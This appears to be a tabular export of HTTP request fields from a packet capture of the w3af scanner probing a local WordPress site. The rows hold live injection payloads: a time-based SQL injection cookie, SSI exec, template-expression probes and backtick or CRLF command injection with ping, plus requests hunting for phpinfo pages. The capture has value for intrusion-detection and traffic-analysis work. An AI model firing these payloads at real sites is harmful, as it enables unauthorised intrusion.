http.accept	http.accept_encoding	http.accept_language	http.authbasic	http.authcitrix	http.authcitrix.domain	http.authcitrix.password	http.authcitrix.session	http.authcitrix.user	http.authorization	http.bad_header_name	http.cache_control	http.chat	http.chunk_boundary	http.chunk_size	http.chunkd_and_length	http.chunked_trailer_part	http.connection	http.content_encoding	http.content_length	http.content_length_header	http.content_type	http.cookie_pair	http.date	http.decompression_disabled	http.decompression_failed	http.file_data	http.host	http.http2_settings	http.http2_settings_uri	http.last_modified	http.leading_crlf	http.location	http.next_request_in	http.next_response_in	http.notification	http.prev_request_in	http.proxy_authenticate	http.proxy_authorization	http.proxy_connect_host	http.proxy_connect_port	http.referer	http.request	http.request.full_uri	http.request.line	http.request.method	http.request.uri.path	http.request.uri.query	http.request.uri.query.parameter	http.request.version	http.request_in	http.request_number	http.sec_websocket_accept	http.sec_websocket_extensions	http.sec_websocket_key	http.sec_websocket_protocol	http.sec_websocket_version	http.server	http.set_cookie	http.ssl_port	http.subdissector_failed	http.te_and_length	http.te_unknown	http.time	http.tls_port	http.transfer_encoding	http.unknown_header	http.upgrade	http.user_agent	http.www_authenticate	http.x_forwarded_for	http.cookie	http.request.uri
*/*	gzip, deflate																keep-alive		0	0	application/x-www-form-urlencoded						192.168.1.104									58566					http://192.168.1.104/	1	http://192.168.1.104/web/2022/02/02/hola-mundo/?replytocom=http%3A%2F%2Fwww.w3af.org%2F		GET				HTTP/1.1																			w3af.org			comment_author_url_9cc7d3138850b577ba48b1e6461447e9=http%3A%2F%2Fwww.w3af.org%2F; comment_author_email_9cc7d3138850b577ba48b1e6461447e9=w3af%40email.com; comment_author_9cc7d3138850b577ba48b1e6461447e9=%22%2B%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29foo%29%2B%22	/web/2022/02/02/hola-mundo/?replytocom=http%3A%2F%2Fwww.w3af.org%2F
*/*	gzip, deflate																keep-alive		0	0	application/x-www-form-urlencoded						192.168.1.104									58592					http://192.168.1.104/	1	http://192.168.1.104/web/2022/02/02/hola-mundo/?replytocom=%3C%21--		GET				HTTP/1.1																			w3af.org			comment_author_url_9cc7d3138850b577ba48b1e6461447e9=http%3A%2F%2Fwww.w3af.org%2F; comment_author_email_9cc7d3138850b577ba48b1e6461447e9=w3af%40email.com; comment_author_9cc7d3138850b577ba48b1e6461447e9=%22%2B%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29foo%29%2B%22	/web/2022/02/02/hola-mundo/?replytocom=%3C%21--
*/*	gzip, deflate																keep-alive		0	0	application/x-www-form-urlencoded						192.168.1.104														http://192.168.1.104/	1	http://192.168.1.104/web/2022/02/02/hola-mundo/?replytocom=%3C%21--		GET				HTTP/1.1																			w3af.org			comment_author_url_9cc7d3138850b577ba48b1e6461447e9=http%3A%2F%2Fwww.w3af.org%2F; comment_author_email_9cc7d3138850b577ba48b1e6461447e9=w3af%40email.com; comment_author_9cc7d3138850b577ba48b1e6461447e9=%22%2B%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29foo%29%2B%22	/web/2022/02/02/hola-mundo/?replytocom=%3C%21--
*/*	gzip, deflate																keep-alive		0	0	application/x-www-form-urlencoded						192.168.1.104														http://192.168.1.104/	1	http://192.168.1.104/web/2022/02/02/hola-mundo/?replytocom=d%27z%220		GET				HTTP/1.1																			w3af.org			comment_author_url_9cc7d3138850b577ba48b1e6461447e9=http%3A%2F%2Fwww.w3af.org%2F; comment_author_email_9cc7d3138850b577ba48b1e6461447e9=w3af%40email.com; comment_author_9cc7d3138850b577ba48b1e6461447e9=%22%2B%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29foo%29%2B%22	/web/2022/02/02/hola-mundo/?replytocom=d%27z%220
*/*	gzip, deflate																keep-alive		0	0	application/x-www-form-urlencoded						192.168.1.104									59112					http://192.168.1.104/	1	http://192.168.1.104/web/2022/02/02/hola-mundo/?replytocom=%3C%21--%23exec%20cmd%3D%22echo%20-n%2058892%3Becho%20-n%2031949%22%20--%3E		GET				HTTP/1.1																			w3af.org			comment_author_url_9cc7d3138850b577ba48b1e6461447e9=http%3A%2F%2Fwww.w3af.org%2F; comment_author_email_9cc7d3138850b577ba48b1e6461447e9=w3af%40email.com; comment_author_9cc7d3138850b577ba48b1e6461447e9=%22%2B%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29foo%29%2B%22	/web/2022/02/02/hola-mundo/?replytocom=%3C%21--%23exec%20cmd%3D%22echo%20-n%2058892%3Becho%20-n%2031949%22%20--%3E
*/*	gzip, deflate																keep-alive		0	0	application/x-www-form-urlencoded						192.168.1.104									59140					http://192.168.1.104/	1	http://192.168.1.104/web/2022/02/02/hola-mundo/?replytocom=%3C%21--%23set%20var%3D%22SEED_A%22%20value%3D%2239345%22%20--%3E%3C%21--%23echo%20var%3D%22SEED_A%22%20--%3E%3C%21--%23set%20var%3D%22SEED_B%22%20value%3D%2221183%22%20--%3E%3C%21--%23echo%20var%3D%22SEED_B%22%20--%3E		GET				HTTP/1.1																			w3af.org			comment_author_url_9cc7d3138850b577ba48b1e6461447e9=http%3A%2F%2Fwww.w3af.org%2F; comment_author_email_9cc7d3138850b577ba48b1e6461447e9=w3af%40email.com; comment_author_9cc7d3138850b577ba48b1e6461447e9=%22%2B%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29foo%29%2B%22	/web/2022/02/02/hola-mundo/?replytocom=%3C%21--%23set%20var%3D%22SEED_A%22%20value%3D%2239345%22%20--%3E%3C%21--%23echo%20var%3D%22SEED_A%22%20--%3E%3C%21--%23set%20var%3D%22SEED_B%22%20value%3D%2221183%22%20--%3E%3C%21--%23echo%20var%3D%22SEED_B%22%20--%3E
*/*	gzip, deflate																keep-alive		0	0	application/x-www-form-urlencoded						192.168.1.104									58642					http://192.168.1.104/	1	http://192.168.1.104/web/2022/02/02/hola-mundo/?replytocom=%7Bmath%20equation%3D%22x%20%2A%20y%22%20x%3D22141%20y%3D78716%7D		GET				HTTP/1.1																			w3af.org			comment_author_url_9cc7d3138850b577ba48b1e6461447e9=http%3A%2F%2Fwww.w3af.org%2F; comment_author_email_9cc7d3138850b577ba48b1e6461447e9=w3af%40email.com; comment_author_9cc7d3138850b577ba48b1e6461447e9=%22%2B%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29foo%29%2B%22	/web/2022/02/02/hola-mundo/?replytocom=%7Bmath%20equation%3D%22x%20%2A%20y%22%20x%3D22141%20y%3D78716%7D
*/*	gzip, deflate																keep-alive		0	0	application/x-www-form-urlencoded						192.168.1.104														http://192.168.1.104/	1	http://192.168.1.104/web/2022/02/02/hola-mundo/?replytocom=%7Bmath%20equation%3D%22x%20%2A%20y%22%20x%3D22141%20y%3D78716%7D		GET				HTTP/1.1																			w3af.org			comment_author_url_9cc7d3138850b577ba48b1e6461447e9=http%3A%2F%2Fwww.w3af.org%2F; comment_author_email_9cc7d3138850b577ba48b1e6461447e9=w3af%40email.com; comment_author_9cc7d3138850b577ba48b1e6461447e9=%22%2B%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29foo%29%2B%22	/web/2022/02/02/hola-mundo/?replytocom=%7Bmath%20equation%3D%22x%20%2A%20y%22%20x%3D22141%20y%3D78716%7D
*/*	gzip, deflate																keep-alive		0	0	application/x-www-form-urlencoded						192.168.1.104														http://192.168.1.104/	1	http://192.168.1.104/web/2022/02/02/hola-mundo/?replytocom=%24%7B78436%20%2A%2093322%7D		GET				HTTP/1.1																			w3af.org			comment_author_url_9cc7d3138850b577ba48b1e6461447e9=http%3A%2F%2Fwww.w3af.org%2F; comment_author_email_9cc7d3138850b577ba48b1e6461447e9=w3af%40email.com; comment_author_9cc7d3138850b577ba48b1e6461447e9=%22%2B%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29foo%29%2B%22	/web/2022/02/02/hola-mundo/?replytocom=%24%7B78436%20%2A%2093322%7D
*/*	gzip, deflate																keep-alive		0	0	application/x-www-form-urlencoded						192.168.1.104														http://192.168.1.104/	1	http://192.168.1.104/web/2022/02/02/hola-mundo/?replytocom=%7B%7B48393%20%2A%2028828%7D%7D		GET				HTTP/1.1																			w3af.org			comment_author_url_9cc7d3138850b577ba48b1e6461447e9=http%3A%2F%2Fwww.w3af.org%2F; comment_author_email_9cc7d3138850b577ba48b1e6461447e9=w3af%40email.com; comment_author_9cc7d3138850b577ba48b1e6461447e9=%22%2B%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29foo%29%2B%22	/web/2022/02/02/hola-mundo/?replytocom=%7B%7B48393%20%2A%2028828%7D%7D
*/*	gzip, deflate																keep-alive		0	0	application/x-www-form-urlencoded						192.168.1.104														http://192.168.1.104/	1	http://192.168.1.104/web/2022/02/02/hola-mundo/?replytocom=%7B87681%20%2A%2048163%7D		GET				HTTP/1.1																			w3af.org			comment_author_url_9cc7d3138850b577ba48b1e6461447e9=http%3A%2F%2Fwww.w3af.org%2F; comment_author_email_9cc7d3138850b577ba48b1e6461447e9=w3af%40email.com; comment_author_9cc7d3138850b577ba48b1e6461447e9=%22%2B%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29foo%29%2B%22	/web/2022/02/02/hola-mundo/?replytocom=%7B87681%20%2A%2048163%7D
*/*	gzip, deflate																keep-alive										192.168.1.104														http://192.168.1.104/	1	http://192.168.1.104/web/wp-includes/php-compat/readonly.php		GET				HTTP/1.1																			w3af.org			comment_author_url_9cc7d3138850b577ba48b1e6461447e9=http%3A%2F%2Fwww.w3af.org%2F; comment_author_email_9cc7d3138850b577ba48b1e6461447e9=w3af%40email.com; comment_author_9cc7d3138850b577ba48b1e6461447e9=%22%2B%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29foo%29%2B%22	/web/wp-includes/php-compat/readonly.php
*/*	gzip, deflate																keep-alive										192.168.1.104															1	http://192.168.1.104/web/,		GET				HTTP/1.1																			w3af.org			comment_author_url_9cc7d3138850b577ba48b1e6461447e9=http%3A%2F%2Fwww.w3af.org%2F; comment_author_email_9cc7d3138850b577ba48b1e6461447e9=w3af%40email.com; comment_author_9cc7d3138850b577ba48b1e6461447e9=%22%2B%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29foo%29%2B%22	/web/,
*/*	gzip, deflate																keep-alive										192.168.1.104									59510						1	http://192.168.1.104/web/wp-includes/php-compat/test1.php		GET				HTTP/1.1																			w3af.org			comment_author_url_9cc7d3138850b577ba48b1e6461447e9=http%3A%2F%2Fwww.w3af.org%2F; comment_author_email_9cc7d3138850b577ba48b1e6461447e9=w3af%40email.com; comment_author_9cc7d3138850b577ba48b1e6461447e9=%22%2B%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29foo%29%2B%22	/web/wp-includes/php-compat/test1.php
*/*	gzip, deflate																keep-alive		171	171	application/x-www-form-urlencoded						192.168.1.104									59770					http://192.168.1.104/	1	http://192.168.1.104/web/wp-comments-post.php		POST				HTTP/1.1																			w3af.org			comment_author_url_9cc7d3138850b577ba48b1e6461447e9=http%3A%2F%2Fwww.w3af.org%2F; comment_author_email_9cc7d3138850b577ba48b1e6461447e9=w3af%40email.com; comment_author_9cc7d3138850b577ba48b1e6461447e9=%22%2B%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29foo%29%2B%22	/web/wp-comments-post.php
*/*	gzip, deflate																keep-alive		0	0	application/x-www-form-urlencoded						192.168.1.104									59759					http://192.168.1.104/	1	http://192.168.1.104/web/2022/02/02/hola-mundo/?replytocom=%0D%0A%2Fusr%2Fsbin%2Fping%20-s%20localhost%209		GET				HTTP/1.1																			w3af.org			comment_author_url_9cc7d3138850b577ba48b1e6461447e9=http%3A%2F%2Fwww.w3af.org%2F; comment_author_email_9cc7d3138850b577ba48b1e6461447e9=w3af%40email.com; comment_author_9cc7d3138850b577ba48b1e6461447e9=%22%2B%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29foo%29%2B%22	/web/2022/02/02/hola-mundo/?replytocom=%0D%0A%2Fusr%2Fsbin%2Fping%20-s%20localhost%209
*/*	gzip, deflate																keep-alive		0	0	application/x-www-form-urlencoded						192.168.1.104														http://192.168.1.104/	1	http://192.168.1.104/web/2022/02/02/hola-mundo/?replytocom=%0D%0A%2Fusr%2Fsbin%2Fping%20-s%20localhost%209		GET				HTTP/1.1																			w3af.org			comment_author_url_9cc7d3138850b577ba48b1e6461447e9=http%3A%2F%2Fwww.w3af.org%2F; comment_author_email_9cc7d3138850b577ba48b1e6461447e9=w3af%40email.com; comment_author_9cc7d3138850b577ba48b1e6461447e9=%22%2B%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29foo%29%2B%22	/web/2022/02/02/hola-mundo/?replytocom=%0D%0A%2Fusr%2Fsbin%2Fping%20-s%20localhost%209
*/*	gzip, deflate																keep-alive		0	0	application/x-www-form-urlencoded						192.168.1.104									59453					http://192.168.1.104/	1	http://192.168.1.104/web/2022/02/02/hola-mundo/?replytocom=a%40a.aaaaaaaaaaX%21		GET				HTTP/1.1																			w3af.org			comment_author_url_9cc7d3138850b577ba48b1e6461447e9=http%3A%2F%2Fwww.w3af.org%2F; comment_author_email_9cc7d3138850b577ba48b1e6461447e9=w3af%40email.com; comment_author_9cc7d3138850b577ba48b1e6461447e9=%22%2B%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29foo%29%2B%22	/web/2022/02/02/hola-mundo/?replytocom=a%40a.aaaaaaaaaaX%21
*/*	gzip, deflate																keep-alive		0	0	application/x-www-form-urlencoded						192.168.1.104														http://192.168.1.104/	1	http://192.168.1.104/web/2022/02/02/hola-mundo/?replytocom=a%40a.aaaaaaaaaaX%21		GET				HTTP/1.1																			w3af.org			comment_author_url_9cc7d3138850b577ba48b1e6461447e9=http%3A%2F%2Fwww.w3af.org%2F; comment_author_email_9cc7d3138850b577ba48b1e6461447e9=w3af%40email.com; comment_author_9cc7d3138850b577ba48b1e6461447e9=%22%2B%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29foo%29%2B%22	/web/2022/02/02/hola-mundo/?replytocom=a%40a.aaaaaaaaaaX%21
*/*	gzip, deflate																keep-alive		0	0	application/x-www-form-urlencoded						192.168.1.104									59644					http://192.168.1.104/	1	http://192.168.1.104/web/2022/02/02/hola-mundo/?replytocom=run%20ping%20-n%209%20localhost		GET				HTTP/1.1																			w3af.org			comment_author_url_9cc7d3138850b577ba48b1e6461447e9=http%3A%2F%2Fwww.w3af.org%2F; comment_author_email_9cc7d3138850b577ba48b1e6461447e9=w3af%40email.com; comment_author_9cc7d3138850b577ba48b1e6461447e9=%22%2B%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29foo%29%2B%22	/web/2022/02/02/hola-mundo/?replytocom=run%20ping%20-n%209%20localhost
*/*	gzip, deflate																keep-alive		0	0	application/x-www-form-urlencoded						192.168.1.104									58698					http://192.168.1.104/	1	http://192.168.1.104/web/2022/02/02/hola-mundo/?replytocom=%60ping%20-c%209%20localhost%60		GET				HTTP/1.1																			w3af.org			comment_author_url_9cc7d3138850b577ba48b1e6461447e9=http%3A%2F%2Fwww.w3af.org%2F; comment_author_email_9cc7d3138850b577ba48b1e6461447e9=w3af%40email.com; comment_author_9cc7d3138850b577ba48b1e6461447e9=%22%2B%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29foo%29%2B%22	/web/2022/02/02/hola-mundo/?replytocom=%60ping%20-c%209%20localhost%60
*/*	gzip, deflate																keep-alive		0	0	application/x-www-form-urlencoded						192.168.1.104														http://192.168.1.104/	1	http://192.168.1.104/web/2022/02/02/hola-mundo/?replytocom=%60ping%20-c%209%20localhost%60		GET				HTTP/1.1																			w3af.org			comment_author_url_9cc7d3138850b577ba48b1e6461447e9=http%3A%2F%2Fwww.w3af.org%2F; comment_author_email_9cc7d3138850b577ba48b1e6461447e9=w3af%40email.com; comment_author_9cc7d3138850b577ba48b1e6461447e9=%22%2B%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29foo%29%2B%22	/web/2022/02/02/hola-mundo/?replytocom=%60ping%20-c%209%20localhost%60
*/*	gzip, deflate																keep-alive		0	0	application/x-www-form-urlencoded						192.168.1.104									56915					http://192.168.1.104/	1	http://192.168.1.104/web/2022/02/02/hola-mundo/?replytocom=11111111119%21		GET				HTTP/1.1																			w3af.org			comment_author_url_9cc7d3138850b577ba48b1e6461447e9=http%3A%2F%2Fwww.w3af.org%2F; comment_author_email_9cc7d3138850b577ba48b1e6461447e9=w3af%40email.com; comment_author_9cc7d3138850b577ba48b1e6461447e9=%22%2B%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29foo%29%2B%22	/web/2022/02/02/hola-mundo/?replytocom=11111111119%21
*/*	gzip, deflate																keep-alive		0	0	application/x-www-form-urlencoded						192.168.1.104														http://192.168.1.104/	1	http://192.168.1.104/web/2022/02/02/hola-mundo/?replytocom=11111111119%21		GET				HTTP/1.1																			w3af.org			comment_author_url_9cc7d3138850b577ba48b1e6461447e9=http%3A%2F%2Fwww.w3af.org%2F; comment_author_email_9cc7d3138850b577ba48b1e6461447e9=w3af%40email.com; comment_author_9cc7d3138850b577ba48b1e6461447e9=%22%2B%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29foo%29%2B%22	/web/2022/02/02/hola-mundo/?replytocom=11111111119%21
*/*	gzip, deflate																keep-alive		0	0	application/x-www-form-urlencoded						192.168.1.104									59708					http://192.168.1.104/	1	http://192.168.1.104/web/2022/02/02/hola-mundo/?replytocom=aaaaaaaaaaX%21		GET				HTTP/1.1																			w3af.org			comment_author_url_9cc7d3138850b577ba48b1e6461447e9=http%3A%2F%2Fwww.w3af.org%2F; comment_author_email_9cc7d3138850b577ba48b1e6461447e9=w3af%40email.com; comment_author_9cc7d3138850b577ba48b1e6461447e9=%22%2B%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29foo%29%2B%22	/web/2022/02/02/hola-mundo/?replytocom=aaaaaaaaaaX%21
*/*	gzip, deflate																keep-alive										192.168.1.104									59813						1	http://192.168.1.104/web/wp-includes/php-compat/INSTALL.php?mode=phpinfo		GET				HTTP/1.1																			w3af.org			comment_author_url_9cc7d3138850b577ba48b1e6461447e9=http%3A%2F%2Fwww.w3af.org%2F; comment_author_email_9cc7d3138850b577ba48b1e6461447e9=w3af%40email.com; comment_author_9cc7d3138850b577ba48b1e6461447e9=%22%2B%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29foo%29%2B%22	/web/wp-includes/php-compat/INSTALL.php?mode=phpinfo
*/*	gzip, deflate																keep-alive										192.168.1.104									59801						1	http://192.168.1.104/web/wp-includes/php-compat/phpVersion.php		GET				HTTP/1.1																			w3af.org			comment_author_url_9cc7d3138850b577ba48b1e6461447e9=http%3A%2F%2Fwww.w3af.org%2F; comment_author_email_9cc7d3138850b577ba48b1e6461447e9=w3af%40email.com; comment_author_9cc7d3138850b577ba48b1e6461447e9=%22%2B%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29foo%29%2B%22	/web/wp-includes/php-compat/phpVersion.php
*/*	gzip, deflate																keep-alive										192.168.1.104									59820						1	http://192.168.1.104/web/wp-includes/php-compat/index.php?mode=phpinfo		GET				HTTP/1.1																			w3af.org			comment_author_url_9cc7d3138850b577ba48b1e6461447e9=http%3A%2F%2Fwww.w3af.org%2F; comment_author_email_9cc7d3138850b577ba48b1e6461447e9=w3af%40email.com; comment_author_9cc7d3138850b577ba48b1e6461447e9=%22%2B%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29foo%29%2B%22	/web/wp-includes/php-compat/index.php?mode=phpinfo
*/*	gzip, deflate																keep-alive										192.168.1.104									59871						1	http://192.168.1.104/web/wp-includes/php-compat/phpInfo.php		GET				HTTP/1.1																			w3af.org			comment_author_url_9cc7d3138850b577ba48b1e6461447e9=http%3A%2F%2Fwww.w3af.org%2F; comment_author_email_9cc7d3138850b577ba48b1e6461447e9=w3af%40email.com; comment_author_9cc7d3138850b577ba48b1e6461447e9=%22%2B%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29foo%29%2B%22	/web/wp-includes/php-compat/phpInfo.php
*/*	gzip, deflate																keep-alive										192.168.1.104															1	http://192.168.1.104/web/wp-includes/php-compat/index.php?view=phpinfo		GET				HTTP/1.1																			w3af.org			comment_author_url_9cc7d3138850b577ba48b1e6461447e9=http%3A%2F%2Fwww.w3af.org%2F; comment_author_email_9cc7d3138850b577ba48b1e6461447e9=w3af%40email.com; comment_author_9cc7d3138850b577ba48b1e6461447e9=%22%2B%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29foo%29%2B%22	/web/wp-includes/php-compat/index.php?view=phpinfo
*/*	gzip, deflate																keep-alive										iDoNotExistPleaseGoAwayNowOrDieWhHP.com									56972						1	http://iDoNotExistPleaseGoAwayNowOrDieWhHP.com/		GET				HTTP/1.1																			w3af.org				/
*/*	gzip, deflate																keep-alive										iDoNotExistPleaseGoAwayNowOrDieWhHP.com															1	http://iDoNotExistPleaseGoAwayNowOrDieWhHP.com/		GET				HTTP/1.1																			w3af.org				/
*/*	gzip, deflate																keep-alive										iDoNotExistPleaseGoAwayNowOrDieu1Iv.192.168.1.104									60232						1	http://iDoNotExistPleaseGoAwayNowOrDieu1Iv.192.168.1.104/		GET				HTTP/1.1																			w3af.org				/
*/*	gzip, deflate																keep-alive										192.168.1.104															1	http://192.168.1.104/web/,		GET				HTTP/1.1																			w3af.org			comment_author_url_9cc7d3138850b577ba48b1e6461447e9=http%3A%2F%2Fwww.w3af.org%2F; comment_author_email_9cc7d3138850b577ba48b1e6461447e9=w3af%40email.com; comment_author_9cc7d3138850b577ba48b1e6461447e9=%22%2B%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29foo%29%2B%22	/web/,
*/*	gzip, deflate																keep-alive		0	0	application/x-www-form-urlencoded						192.168.1.104									58831					http://192.168.1.104/	1	http://192.168.1.104/web/2022/02/02/hola-mundo/?replytocom=%0D%0Aping%20-c%209%20localhost		GET				HTTP/1.1																			w3af.org			comment_author_url_9cc7d3138850b577ba48b1e6461447e9=http%3A%2F%2Fwww.w3af.org%2F; comment_author_email_9cc7d3138850b577ba48b1e6461447e9=w3af%40email.com; comment_author_9cc7d3138850b577ba48b1e6461447e9=%22%2B%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29foo%29%2B%22	/web/2022/02/02/hola-mundo/?replytocom=%0D%0Aping%20-c%209%20localhost
*/*	gzip, deflate																keep-alive		0	0	application/x-www-form-urlencoded						192.168.1.104														http://192.168.1.104/	1	http://192.168.1.104/web/2022/02/02/hola-mundo/?replytocom=%0D%0Aping%20-c%209%20localhost		GET				HTTP/1.1																			w3af.org			comment_author_url_9cc7d3138850b577ba48b1e6461447e9=http%3A%2F%2Fwww.w3af.org%2F; comment_author_email_9cc7d3138850b577ba48b1e6461447e9=w3af%40email.com; comment_author_9cc7d3138850b577ba48b1e6461447e9=%22%2B%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29foo%29%2B%22	/web/2022/02/02/hola-mundo/?replytocom=%0D%0Aping%20-c%209%20localhost
*/*	gzip, deflate																keep-alive		0	0	application/x-www-form-urlencoded						192.168.1.104									57844					http://192.168.1.104/	1	http://192.168.1.104/web/2022/02/02/hola-mundo/?replytocom=%60ping%20-n%209%20localhost%60		GET				HTTP/1.1																			w3af.org			comment_author_url_9cc7d3138850b577ba48b1e6461447e9=http%3A%2F%2Fwww.w3af.org%2F; comment_author_email_9cc7d3138850b577ba48b1e6461447e9=w3af%40email.com; comment_author_9cc7d3138850b577ba48b1e6461447e9=%22%2B%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29foo%29%2B%22	/web/2022/02/02/hola-mundo/?replytocom=%60ping%20-n%209%20localhost%60
*/*	gzip, deflate																keep-alive		0	0	application/x-www-form-urlencoded						192.168.1.104														http://192.168.1.104/	1	http://192.168.1.104/web/2022/02/02/hola-mundo/?replytocom=%60ping%20-n%209%20localhost%60		GET				HTTP/1.1																			w3af.org			comment_author_url_9cc7d3138850b577ba48b1e6461447e9=http%3A%2F%2Fwww.w3af.org%2F; comment_author_email_9cc7d3138850b577ba48b1e6461447e9=w3af%40email.com; comment_author_9cc7d3138850b577ba48b1e6461447e9=%22%2B%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29foo%29%2B%22	/web/2022/02/02/hola-mundo/?replytocom=%60ping%20-n%209%20localhost%60
*/*	gzip, deflate																keep-alive										192.168.1.104									57836						1	http://192.168.1.104/web/wp-includes/php-compat/test.php?mode=phpinfo		GET				HTTP/1.1																			w3af.org			comment_author_url_9cc7d3138850b577ba48b1e6461447e9=http%3A%2F%2Fwww.w3af.org%2F; comment_author_email_9cc7d3138850b577ba48b1e6461447e9=w3af%40email.com; comment_author_9cc7d3138850b577ba48b1e6461447e9=%22%2B%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29foo%29%2B%22	/web/wp-includes/php-compat/test.php?mode=phpinfo
*/*	gzip, deflate																keep-alive										192.168.1.104															1	http://192.168.1.104/web/wp-includes/php-compat/test.php?mode=phpinfo		GET				HTTP/1.1																			w3af.org			comment_author_url_9cc7d3138850b577ba48b1e6461447e9=http%3A%2F%2Fwww.w3af.org%2F; comment_author_email_9cc7d3138850b577ba48b1e6461447e9=w3af%40email.com; comment_author_9cc7d3138850b577ba48b1e6461447e9=%22%2B%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29foo%29%2B%22	/web/wp-includes/php-compat/test.php?mode=phpinfo
*/*	gzip, deflate																keep-alive										192.168.1.104									58955						1	http://192.168.1.104/web/wp-includes/php-compat/PHPinfo.php		GET				HTTP/1.1																			w3af.org			comment_author_url_9cc7d3138850b577ba48b1e6461447e9=http%3A%2F%2Fwww.w3af.org%2F; comment_author_email_9cc7d3138850b577ba48b1e6461447e9=w3af%40email.com; comment_author_9cc7d3138850b577ba48b1e6461447e9=%22%2B%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29foo%29%2B%22	/web/wp-includes/php-compat/PHPinfo.php
*/*	gzip, deflate																keep-alive										192.168.1.104															1	http://192.168.1.104/web/wp-includes/php-compat/PHPinfo.php		GET				HTTP/1.1																			w3af.org			comment_author_url_9cc7d3138850b577ba48b1e6461447e9=http%3A%2F%2Fwww.w3af.org%2F; comment_author_email_9cc7d3138850b577ba48b1e6461447e9=w3af%40email.com; comment_author_9cc7d3138850b577ba48b1e6461447e9=%22%2B%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29foo%29%2B%22	/web/wp-includes/php-compat/PHPinfo.php
*/*	gzip, deflate																keep-alive										192.168.1.104									59942						1	http://192.168.1.104/web/wp-includes/php-compat/xx.php		GET				HTTP/1.1																			w3af.org			comment_author_url_9cc7d3138850b577ba48b1e6461447e9=http%3A%2F%2Fwww.w3af.org%2F; comment_author_email_9cc7d3138850b577ba48b1e6461447e9=w3af%40email.com; comment_author_9cc7d3138850b577ba48b1e6461447e9=%22%2B%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29foo%29%2B%22	/web/wp-includes/php-compat/xx.php
